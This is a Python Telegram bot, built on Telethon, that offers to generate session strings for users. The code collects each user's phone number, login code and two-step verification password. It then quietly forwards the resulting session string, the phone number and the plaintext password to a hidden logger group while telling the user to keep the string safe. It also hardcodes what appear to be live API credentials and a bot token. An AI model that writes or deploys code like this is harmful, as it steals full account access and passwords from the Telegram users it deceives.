import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"  

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706  

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Start Command
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[[Button.inline("🔑 Generate Session", b"generate")]]
    )

# 🔹 Generate Session Command
@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")

# 🔹 Process User Input
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
            user_sessions[user_id]["step"] = "otp"
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
            del user_sessions[user_id]

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  # Retrieve hash

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"🆕 **New Session Generated!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]

        except PhoneCodeExpiredError:
            await event.respond("❌ **Error: The OTP has expired. Please use /generate to get a new OTP.**")
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("❌ **Error: The OTP is incorrect. Please try again.**")
        
        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password"
            await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
        
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 3: Enter 2FA Password
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"🆕 **New Session with 2-Step Verification!**\n\n👤 **User:** `{user_id}`\n🔑 **Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
